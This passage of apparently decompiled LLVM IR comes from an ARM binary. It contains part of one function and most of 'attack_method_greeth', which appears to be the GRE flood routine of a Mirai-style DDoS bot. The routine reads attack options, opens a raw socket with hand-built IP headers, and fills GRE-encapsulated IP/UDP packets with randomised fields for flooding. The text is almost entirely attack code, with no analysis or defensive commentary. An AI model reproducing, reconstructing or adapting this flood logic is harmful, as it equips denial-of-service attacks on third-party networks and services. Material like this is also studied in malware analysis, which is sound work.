  store i1 %v9_9380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9380, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9388:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v0_9388 = call i32 @rand_next()
  %v1_9388 = trunc i32 %v0_9388 to i16
  store i32 %v0_9388, i32* %r0.global-to-local, align 4
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v1_9390 = load i32, i32* @r4, align 4
  %v9_9390 = icmp eq i32 %v3_9098, %v1_9390
  store i1 %v9_9390, i1* %cpsr_z.global-to-local, align 1
  %v3_9394 = load i32, i32* @r5, align 4
  %v4_9394 = add i32 %v3_9394, 20
  %v5_9394 = inttoptr i32 %v4_9394 to i16*
  store i16 %v1_9388, i16* %v5_9394, align 2
  br i1 %v9_9390, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_939c:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  %v0_939c = call i32 @rand_next()
  %v1_939c = trunc i32 %v0_939c to i16
  store i32 %v0_939c, i32* %r0.global-to-local, align 4
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v3_93a8 = load i32, i32* @r6, align 4
  %v4_93a8 = add i32 %v3_93a8, 2
  %v5_93a8 = inttoptr i32 %v4_93a8 to i16*
  store i16 %v1_939c, i16* %v5_93a8, align 2
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c
  %v0_93b0 = load i32, i32* @r5, align 4
  %v1_93b0 = add i32 %v0_93b0, 28
  store i32 %v1_93b0, i32* %r0.global-to-local, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  %v2_93b8 = inttoptr i32 %v1_93b0 to i16*
  %v3_93b8 = call i32 @rand_str(i16* %v2_93b8, i32 %v0_90c8)
  store i32 %v3_93b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9260

dec_label_pc_93c0:                                ; preds = %dec_label_pc_9034
  %v0_93c0 = load i32, i32* @fp, align 4
  store i32 %v0_93c0, i32* %r0.global-to-local, align 4
  %v1_93c4 = call i32 @__GI___libc_close(i32 %v0_93c0)
  store i32 %v1_93c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %entry, %dec_label_pc_93c0
  %v1_93d0 = phi i32 [ %v3_9024, %entry ], [ %v1_93c4, %dec_label_pc_93c0 ]
  store i32 %v18_8eec, i32* %sb.global-to-local, align 4
  store i32 %v27_8eec, i32* %lr.global-to-local, align 4
  ret i32 %v1_93d0

; uselistorder directives
  uselistorder i32 %v0_939c, { 1, 0 }
  uselistorder i32 %v0_9388, { 1, 0 }
  uselistorder i32 %v1_9380, { 1, 0 }
  uselistorder i32 %v3_92f8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_92d4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_92a0, { 1, 0 }
  uselistorder i32 %v4_9290, { 1, 0 }
  uselistorder i1 %v2_93a4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9368, { 3, 2, 0, 1 }
  uselistorder i32 %v3_9114, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_90fc, { 1, 0 }
  uselistorder i32 %v1_90cc, { 1, 0, 2 }
  uselistorder i32 %v1_90c8, { 1, 0, 2 }
  uselistorder i32 %v3_90a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9088, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9080, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_9078, { 1, 0, 2 }
  uselistorder i32 %v0_90c8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_9068, { 3, 1, 2, 0 }
  uselistorder i1 %v7_9054, { 1, 0 }
  uselistorder i1 %v7_9028, { 1, 0 }
  uselistorder i32 %v3_9024, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_9010, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_8ffc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8f88, { 1, 0 }
  uselistorder i32 %v1_8f64, { 1, 0 }
  uselistorder i32 %v6_8f5c, { 1, 0 }
  uselistorder i32 %v7_8f44, { 1, 0, 2, 3 }
  uselistorder i8 %v5_8f40, { 1, 0 }
  uselistorder i32 %v6_8f20, { 1, 0 }
  uselistorder i32 %v2_8f08, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93c8, { 1, 0 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
  uselistorder label %dec_label_pc_9260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_91e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_91e4.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_method_greeth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @r5, align 4
  %v24_93d8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_93f4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_93f8 = load i32, i32* @r5, align 4
  store i32 %v0_93f8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9408 = load i32, i32* @r4, align 4
  store i32 %v0_9408, i32* %r0.global-to-local, align 4
  %v5_940c = inttoptr i32 %v0_93f8 to i32*
  %v6_940c = call i32 @attack_get_opt_int(i32 %v0_9408, i32* %v5_940c, i32 2, i32 0)
  %v1_9418 = urem i32 %v6_940c, 256
  store i32 %v1_9418, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9424 = load i32, i32* @r5, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  %v0_9428 = load i32, i32* @r4, align 4
  store i32 %v0_9428, i32* %r0.global-to-local, align 4
  %v5_942c = trunc i32 %v6_940c to i8
  %v6_9430 = inttoptr i32 %v0_9424 to i32*
  %v7_9430 = call i32 @attack_get_opt_int(i32 %v0_9428, i32* %v6_9430, i32 3, i32 65535)
  %v0_9434 = load i32, i32* @r5, align 4
  store i32 %v0_9434, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9430, i32* %fp.global-to-local, align 4
  %v0_9444 = load i32, i32* @r4, align 4
  store i32 %v0_9444, i32* %r0.global-to-local, align 4
  %v4_9448 = inttoptr i32 %v0_9434 to i32*
  %v5_9448 = call i32 @attack_get_opt_int(i32 %v0_9444, i32* %v4_9448, i32 4, i32 64)
  %v1_9450 = urem i32 %v5_9448, 256
  store i32 %v1_9450, i32* %ip.global-to-local, align 4
  %v0_9454 = load i32, i32* @r5, align 4
  store i32 %v0_9454, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9460 = load i32, i32* @r4, align 4
  store i32 %v0_9460, i32* %r0.global-to-local, align 4
  %v6_9468 = inttoptr i32 %v0_9454 to i32*
  %v7_9468 = call i32 @attack_get_opt_int(i32 %v0_9460, i32* %v6_9468, i32 5, i32 1)
  %v1_9474 = urem i32 %v7_9468, 256
  store i32 %v1_9474, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9480 = load i32, i32* @r5, align 4
  store i32 %v0_9480, i32* %r1.global-to-local, align 4
  %v0_9484 = load i32, i32* @r4, align 4
  store i32 %v0_9484, i32* %r0.global-to-local, align 4
  %v5_948c = inttoptr i32 %v0_9480 to i32*
  %v6_948c = call i32 @attack_get_opt_int(i32 %v0_9484, i32* %v5_948c, i32 6, i32 65535)
  %v0_9494 = load i32, i32* @r5, align 4
  store i32 %v0_9494, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_948c, i32* @r8, align 4
  %v0_94a4 = load i32, i32* @r4, align 4
  store i32 %v0_94a4, i32* %r0.global-to-local, align 4
  %v4_94a8 = inttoptr i32 %v0_9494 to i32*
  %v5_94a8 = call i32 @attack_get_opt_int(i32 %v0_94a4, i32* %v4_94a8, i32 7, i32 65535)
  %v0_94ac = load i32, i32* @r5, align 4
  store i32 %v0_94ac, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_94a8, i32* @r7, align 4
  %v0_94bc = load i32, i32* @r4, align 4
  store i32 %v0_94bc, i32* %r0.global-to-local, align 4
  %v4_94c0 = inttoptr i32 %v0_94ac to i32*
  %v5_94c0 = call i32 @attack_get_opt_int(i32 %v0_94bc, i32* %v4_94c0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r5, align 4
  store i32 %v0_94d0, i32* %r1.global-to-local, align 4
  %v0_94d4 = load i32, i32* @r4, align 4
  store i32 %v0_94d4, i32* %r0.global-to-local, align 4
  %v4_94d8 = inttoptr i32 %v0_94d0 to i32*
  %v5_94d8 = call i32 @attack_get_opt_int(i32 %v0_94d4, i32* %v4_94d8, i32 1, i32 1)
  %v1_94e0 = urem i32 %v5_94d8, 256
  store i32 %v1_94e0, i32* %ip.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r5, align 4
  store i32 %v0_94e4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_94f0 = load i32, i32* @r4, align 4
  store i32 %v0_94f0, i32* %r0.global-to-local, align 4
  %v5_94f8 = inttoptr i32 %v0_94e4 to i32*
  %v6_94f8 = call i32 @attack_get_opt_int(i32 %v0_94f0, i32* %v5_94f8, i32 19, i32 0)
  %v0_9500 = load i32, i32* @r5, align 4
  store i32 %v0_9500, i32* %r1.global-to-local, align 4
  %v2_9504 = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_9504, i32* %r3.global-to-local, align 4
  store i32 %v6_94f8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9510 = load i32, i32* @r4, align 4
  store i32 %v0_9510, i32* %r0.global-to-local, align 4
  %v4_9514 = inttoptr i32 %v0_9500 to i32*
  %v5_9514 = call i32 @attack_get_opt_int(i32 %v0_9510, i32* %v4_9514, i32 25, i32 %v2_9504)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9528 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v7_952c = icmp eq i32 %v3_9528, -1
  store i1 %v7_952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_952c, label %dec_label_pc_9a40, label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9540 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9540, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9554 = call i32 @__GI_setsockopt(i32 %v3_9528, i32 0, i32 3, i32 %v6_9540, i32 4)
  store i32 %v5_9554, i32* %r0.global-to-local, align 4
  %v7_9558 = icmp eq i32 %v5_9554, -1
  store i1 %v7_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9558, label %dec_label_pc_9a38, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9538
  %v0_9560 = load i32, i32* @r8, align 4
  %v0_9564 = load i32, i32* @r7, align 4
  %v0_9568 = load i32, i32* %fp.global-to-local, align 4
  %v0_956c = load i32, i32* @r6, align 4
  %v1_956c = urem i32 %v0_956c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9574 = urem i32 %v0_9560, 65536
  store i32 %v3_9574, i32* %r3.global-to-local, align 4
  %v3_9578 = urem i32 %v0_9564, 65536
  store i32 %v3_9578, i32* %r4.global-to-local, align 4
  %v0_957c = load i32, i32* @sl, align 4
  %v2_957c = icmp eq i32 %v0_957c, 0
  store i1 %v2_957c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9594 = urem i32 %v0_9568, 65536
  store i32 %v3_9594, i32* @fp, align 4
  br i1 %v2_957c, label %dec_label_pc_9a4c, label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9560
  %v3_9564 = mul i32 %v0_9564, 65536
  %v3_9560 = mul i32 %v0_9560, 65536
  %v0_9568.not = or i32 %v0_9568, -65536
  %v1_95a8 = xor i32 %v0_9568.not, 65535
  %v3_95ac = mul i32 %v5_94c0, 65536
  %v1_95b0 = add i32 %v3_95ac, 4325376
  %tmp73 = udiv i32 %v1_95b0, 256
  %v3_95c4 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_95a8, 256
  %v3_95c8 = and i32 %tmp74, 65280
  store i32 %v3_95c8, i32* %ip.global-to-local, align 4
  %v1_95cc = add i32 %v3_95ac, 524288
  %v1_95d4 = add i32 %v3_95ac, 1835008
  %tmp75 = udiv i32 %v1_95a8, 256
  %v4_95d8 = urem i32 %tmp75, 256
  %v5_95d8 = or i32 %v4_95d8, %v3_95c8
  %v4_95e0 = udiv i32 %v1_95b0, 16777216
  %v5_95e0 = or i32 %v3_95c4, %v4_95e0
  store i32 %v5_95e0, i32* @r8, align 4
  %v3_95ec = udiv i32 %v1_95d4, 256
  %tmp76 = mul i32 %v0_9568, 256
  %v3_95f0 = and i32 %tmp76, 65280
  store i32 %v3_9560, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_9568, 256
  %v4_9600 = urem i32 %tmp77, 256
  %v5_9600 = or i32 %v4_9600, %v3_95f0
  store i32 %v5_9600, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_9560, 256
  %v3_9604 = and i32 %tmp78, 65280
  %v1_9608 = and i32 %v3_95ec, 65280
  store i32 %v1_9608, i32* @r6, align 4
  store i32 %v3_9564, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_9564, 256
  %v3_9614 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_9560, 256
  %v4_9618 = urem i32 %tmp80, 256
  %v5_9618 = or i32 %v4_9618, %v3_9604
  store i32 %v5_9618, i32* @lr, align 4
  %v4_961c = udiv i32 %v1_95d4, 16777216
  %v5_961c = or i32 %v1_9608, %v4_961c
  store i32 %v5_961c, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_9564, 256
  %v4_9620 = urem i32 %tmp81, 256
  %v5_9620 = or i32 %v4_9620, %v3_9614
  %tmp82 = udiv i32 %v1_95cc, 256
  %v3_9624 = and i32 %tmp82, 65280
  store i32 %v3_9624, i32* @r5, align 4
  %v5_9628 = trunc i32 %v5_9600 to i16
  %v5_9630 = trunc i32 %v5_961c to i16
  %v4_9638 = udiv i32 %v1_95cc, 16777216
  %v5_9638 = or i32 %v3_9624, %v4_9638
  store i32 %v5_9638, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9694 = sext i8 %v5_942c to i32
  %v1_96a0 = trunc i32 %v5_9448 to i8
  %sext = mul nuw i32 %v5_95d8, 65536
  %v4_972c = sdiv i32 %sext, 65536
  %v2_9758 = icmp eq i32 %v1_956c, 0
  %sext8 = mul nuw i32 %v5_9618, 65536
  %v4_9778 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9620, 65536
  %v4_9780 = sdiv i32 %sext9, 65536
  %v1_973827 = trunc i32 %v4_972c to i16
  br label %dec_label_pc_9640

dec_label_pc_9640:                                ; preds = %bb85, %dec_label_pc_95a4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_964c = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_964c, i32* %r0.global-to-local, align 4
  %v2_9654 = load i32, i32* @r4, align 4
  %v5_9654 = mul i32 %v2_9654, 4
  %v6_9654 = add i32 %v5_9654, %v2_93f4
  %v7_9654 = inttoptr i32 %v6_9654 to i32*
  store i32 %v2_964c, i32* %v7_9654, align 4
  %v3_9658 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9658, i32* %r2.global-to-local, align 4
  %v5_9660 = mul i32 %v3_9658, 24
  %v1_9664 = load i32, i32* @sb, align 4
  %v2_9664 = add i32 %v1_9664, %v5_9660
  store i32 %v2_9664, i32* @lr, align 4
  store i32 %v2_93f4, i32* %r3.global-to-local, align 4
  %v4_966c = mul i32 %v3_9658, 4
  %v5_966c = add i32 %v4_966c, %v2_93f4
  %v6_966c = inttoptr i32 %v5_966c to i32*
  %v7_966c = load i32, i32* %v6_966c, align 4
  store i32 %v7_966c, i32* %r4.global-to-local, align 4
  %v1_9670 = inttoptr i32 %v7_966c to i8*
  %v2_9670 = load i8, i8* %v1_9670, align 1
  %tmp = urem i8 %v2_9670, 16
  %v1_9674 = zext i8 %tmp to i32
  %v1_9678 = or i32 %v1_9674, 64
  store i32 %v1_9678, i32* %r3.global-to-local, align 4
  %v1_967c = trunc i32 %v1_9678 to i8
  store i8 %v1_967c, i8* %v1_9670, align 1
  %v0_9680 = load i32, i32* %r4.global-to-local, align 4
  %v1_9680 = inttoptr i32 %v0_9680 to i8*
  %v2_9680 = load i8, i8* %v1_9680, align 1
  %v1_9684 = and i8 %v2_9680, -16
  %v1_9688 = or i8 %v1_9684, 5
  store i32 %v1_9474, i32* %r5.global-to-local, align 4
  store i8 %v1_9688, i8* %v1_9680, align 1
  store i32 %v4_9694, i32* %r1.global-to-local, align 4
  %v2_9698 = load i32, i32* %r4.global-to-local, align 4
  %v3_9698 = add i32 %v2_9698, 1
  %v4_9698 = inttoptr i32 %v3_9698 to i8*
  store i8 %v5_942c, i8* %v4_9698, align 1
  store i32 %v1_9450, i32* %r2.global-to-local, align 4
  %v2_96a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a0 = add i32 %v2_96a0, 8
  %v4_96a0 = inttoptr i32 %v3_96a0 to i8*
  store i8 %v1_96a0, i8* %v4_96a0, align 1
  %v2_96a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a8 = add i32 %v2_96a8, 4
  %v4_96a8 = inttoptr i32 %v3_96a8 to i16*
  store i16 %v5_9628, i16* %v4_96a8, align 2
  %v2_96b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96b0 = add i32 %v2_96b0, 9
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 47, i8* %v4_96b0, align 1
  store i32 %v5_9514, i32* %r3.global-to-local, align 4
  %v0_96b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_96b8 = icmp eq i32 %v0_96b8, 0
  store i1 %v2_96b8, i1* %cpsr_z.global-to-local, align 1
  %v1_96bc = load i32, i32* %r4.global-to-local, align 4
  %v2_96bc = add i32 %v1_96bc, 12
  %v3_96bc = inttoptr i32 %v2_96bc to i32*
  store i32 %v5_9514, i32* %v3_96bc, align 4
  br i1 %v2_96b8, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_9640
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_96c4 = load i32, i32* %r4.global-to-local, align 4
  %v4_96c4 = add i32 %v3_96c4, 6
  %v5_96c4 = inttoptr i32 %v4_96c4 to i16*
  store i16 64, i16* %v5_96c4, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9640, %bb
  %v0_96c8 = load i32, i32* @lr, align 4
  %v1_96c8 = add i32 %v0_96c8, 16
  %v2_96c8 = inttoptr i32 %v1_96c8 to i32*
  %v3_96c8 = load i32, i32* %v2_96c8, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_96d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_96d0 = add i32 %v1_96d0, 16
  %v3_96d0 = inttoptr i32 %v2_96d0 to i32*
  store i32 %v3_96c8, i32* %v3_96d0, align 4
  %v0_96d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_96d4 = add i32 %v0_96d4, 24
  store i32 %v1_96d4, i32* %r1.global-to-local, align 4
  %v1_96d8 = add i32 %v0_96d4, 20
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  %v0_96dc = load i32, i32* %ip.global-to-local, align 4
  %v1_96dc = add i32 %v0_96dc, 101
  store i32 %v1_96dc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_96e8 = load i32, i32* @r8, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i16
  %v3_96e8 = add i32 %v0_96d4, 2
  %v4_96e8 = inttoptr i32 %v3_96e8 to i16*
  store i16 %v1_96e8, i16* %v4_96e8, align 2
  %v0_96ec = load i32, i32* %ip.global-to-local, align 4
  %v1_96ec = trunc i32 %v0_96ec to i16
  %v2_96ec = load i32, i32* %r0.global-to-local, align 4
  %v3_96ec = add i32 %v2_96ec, 2
  %v4_96ec = inttoptr i32 %v3_96ec to i16*
  store i16 %v1_96ec, i16* %v4_96ec, align 2
  %v0_96f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96f0 = trunc i32 %v0_96f0 to i8
  %v2_96f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f0 = add i32 %v2_96f0, 13
  %v4_96f0 = inttoptr i32 %v3_96f0 to i8*
  store i8 %v1_96f0, i8* %v4_96f0, align 1
  %v0_96f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_96f4 = trunc i32 %v0_96f4 to i8
  %v2_96f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f4 = add i32 %v2_96f4, 12
  %v4_96f4 = inttoptr i32 %v3_96f4 to i8*
  store i8 %v1_96f4, i8* %v4_96f4, align 1
  %v0_96f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96f8 = add i32 %v0_96f8, 38
  %v2_96f8 = inttoptr i32 %v1_96f8 to i8*
  %v3_96f8 = load i8, i8* %v2_96f8, align 1
  %tmp89 = urem i8 %v3_96f8, 16
  %v1_96fc = zext i8 %tmp89 to i32
  %v1_9700 = or i32 %v1_96fc, 64
  store i32 %v1_9700, i32* %r3.global-to-local, align 4
  %v1_9704 = trunc i32 %v1_9700 to i8
  store i8 %v1_9704, i8* %v2_96f8, align 1
  %v0_9708 = load i32, i32* %r4.global-to-local, align 4
  %v1_9708 = add i32 %v0_9708, 38
  %v2_9708 = inttoptr i32 %v1_9708 to i8*
  %v3_9708 = load i8, i8* %v2_9708, align 1
  %v1_970c = and i8 %v3_9708, -16
  %v1_9710 = or i8 %v1_970c, 5
  store i8 %v1_9710, i8* %v2_9708, align 1
  %v0_971c = load i32, i32* %r4.global-to-local, align 4
  %v1_971c = add i32 %v0_971c, 38
  store i32 %v1_971c, i32* @r5, align 4
  %v3_9720 = add i32 %v0_971c, 39
  %v4_9720 = inttoptr i32 %v3_9720 to i8*
  store i8 %v5_942c, i8* %v4_9720, align 1
  store i32 %v5_961c, i32* %r2.global-to-local, align 4
  %v2_9728 = load i32, i32* @r5, align 4
  %v3_9728 = add i32 %v2_9728, 2
  %v4_9728 = inttoptr i32 %v3_9728 to i16*
  store i16 %v5_9630, i16* %v4_9728, align 2
  store i32 %v4_972c, i32* %r3.global-to-local, align 4
  store i32 %v1_9450, i32* %r1.global-to-local, align 4
  %v0_9734 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9734, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_973828 = load i32, i32* @r5, align 4
  %v3_973829 = add i32 %v2_973828, 4
  %v4_973830 = inttoptr i32 %v3_973829 to i16*
  store i16 %v1_973827, i16* %v4_973830, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_9738 = load i32, i32* @r5, align 4
  %v3_9738 = add i32 %v2_9738, 4
  %v4_9738 = inttoptr i32 %v3_9738 to i16*
  store i16 %v1_973827, i16* %v4_9738, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_9740 = load i32, i32* %r2.global-to-local, align 4
  %v2_9740 = trunc i32 %v1_9740 to i16
  %v3_9740 = load i32, i32* @r5, align 4
  %v4_9740 = add i32 %v3_9740, 6
  %v5_9740 = inttoptr i32 %v4_9740 to i16*
  store i16 %v2_9740, i16* %v5_9740, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_9744 = load i32, i32* %r1.global-to-local, align 4
  %v1_9744 = trunc i32 %v0_9744 to i8
  %v2_9744 = load i32, i32* @r5, align 4
  %v3_9744 = add i32 %v2_9744, 8
  %v4_9744 = inttoptr i32 %v3_9744 to i8*
  store i8 %v1_9744, i8* %v4_9744, align 1
  %v0_9748 = load i32, i32* %r3.global-to-local, align 4
  %v1_9748 = trunc i32 %v0_9748 to i8
  %v2_9748 = load i32, i32* @r5, align 4
  %v3_9748 = add i32 %v2_9748, 9
  %v4_9748 = inttoptr i32 %v3_9748 to i8*
  store i8 %v1_9748, i8* %v4_9748, align 1
  %v0_974c = call i32 @rand_next()
  store i32 %v0_974c, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* %r1.global-to-local, align 4
  store i1 %v2_9758, i1* %cpsr_z.global-to-local, align 1
  %v1_975c = sub i32 1023, %v0_974c
  store i32 %v1_975c, i32* %r3.global-to-local, align 4
  br i1 %v2_9758, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_9764 = load i32, i32* @r5, align 4
  %v3_9764 = add i32 %v2_9764, 16
  %v4_9764 = inttoptr i32 %v3_9764 to i32*
  store i32 %v1_975c, i32* %v4_9764, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_9760 = load i32, i32* %r4.global-to-local, align 4
  %v2_9760 = add i32 %v1_9760, 16
  %v3_9760 = inttoptr i32 %v2_9760 to i32*
  %v4_9760 = load i32, i32* %v3_9760, align 4
  store i32 %v4_9760, i32* %r3.global-to-local, align 4
  %v2_9768 = load i32, i32* @r5, align 4
  %v3_9768 = add i32 %v2_9768, 16
  %v4_9768 = inttoptr i32 %v3_9768 to i32*
  store i32 %v4_9760, i32* %v4_9768, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_976c = load i32, i32* @r5, align 4
  %v2_976c = add i32 %v1_976c, 12
  %v3_976c = inttoptr i32 %v2_976c to i32*
  store i32 %v0_974c, i32* %v3_976c, align 4
  %v3_9770 = load i32, i32* %stack_var_-44, align 4
  %v0_9774 = load i32, i32* %r4.global-to-local, align 4
  %v1_9774 = add i32 %v0_9774, 58
  store i32 %v1_9774, i32* @r6, align 4
  store i32 %v4_9778, i32* %r2.global-to-local, align 4
  %v1_977c = add i32 %v3_9770, 1
